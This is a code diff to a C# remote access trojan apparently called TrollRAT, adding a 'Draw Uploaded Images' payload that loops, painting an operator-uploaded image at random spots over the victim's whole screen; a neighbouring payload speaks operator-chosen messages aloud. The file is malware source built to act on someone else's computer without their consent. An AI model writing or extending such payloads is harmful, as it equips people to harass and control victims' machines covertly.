@@ -1,9 +1,11 @@
 ﻿using System;
+using System.Drawing;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Speech.Synthesis;
-
+using System.Windows.Forms;
 using TrollRAT.Payloads;
+using TrollRAT.Server.Commands;
 using TrollRATActions;
 
 namespace TrollRATPayloads.Payloads
@@ -186,6 +188,60 @@ namespace TrollRATPayloads.Payloads
                 synth.Speak(message.Value);
             }
             catch (Exception) { }
+        }
+    }
+
+    public class PayloadDrawImages : LoopingPayload
+    {
+        private PayloadSettingNumber scaleFactor = new PayloadSettingNumber(100, "Scale Factor (in %)", 1, 100, 1);
+        private PayloadSettingSelectFile fileName = new PayloadSettingSelectFile(
+            0, "Uploaded File Name", UploadCommand.uploadDir);
+
+        private Random rng = new Random();
+
+        private Bitmap image;
+        private Graphics screen = Graphics.FromHwnd(IntPtr.Zero);
+
+        public void imageChanged<t>(object sender, t selectedFile)
+        {
+            if (image != null)
+            {
+                image.Dispose();
+                image = null;
+            }
+
+            try
+            {
+                using (Bitmap newImage = new Bitmap(fileName.selectedFilePath))
+                {
+                    image = new Bitmap(newImage, new Size((int)(newImage.Width * (scaleFactor.Value / 100)),
+                        (int)(newImage.Height * (scaleFactor.Value / 100))));
+                }
+            } catch (Exception) { }
+        }
+
+        public PayloadDrawImages() : base(10)
+        {
+            settings.Add(fileName);
+            settings.Add(scaleFactor);
+
+            imageChanged(null, 0);
+
+            scaleFactor.SettingChanged += new PayloadSettingNumber.PayloadSettingChangeEvent(imageChanged);
+            fileName.SettingChanged += new PayloadSettingSelectFile.PayloadSettingChangeEvent(imageChanged);
+
+            name = "Draw Uploaded Images";
+        }
+
+        protected override void execute()
+        {
+            if (image != null)
+            {
+                int x = rng.Next(0, Screen.PrimaryScreen.Bounds.Width - image.Width);
+                int y = rng.Next(0, Screen.PrimaryScreen.Bounds.Height - image.Height);
+
+                screen.DrawImageUnscaled(image, x, y);
+            }
         }
     }
 }
